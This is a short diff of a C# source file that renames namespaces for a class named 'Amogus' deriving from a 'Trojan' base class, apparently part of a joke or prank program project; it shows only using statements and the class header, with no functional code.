@@ -8,9 +8,9 @@ using System.Drawing;
 using System.Drawing.Drawing2D;
 using System.Media;
 using System.Windows.Forms;
-using Zigman.Engine.Legacy;
+using TheAirBlow.Zigman.Legacy;
 
-namespace Zigman.Amogus;
+namespace TheAirBlow.Amogus;
 
 public class Amogus : Trojan
 {
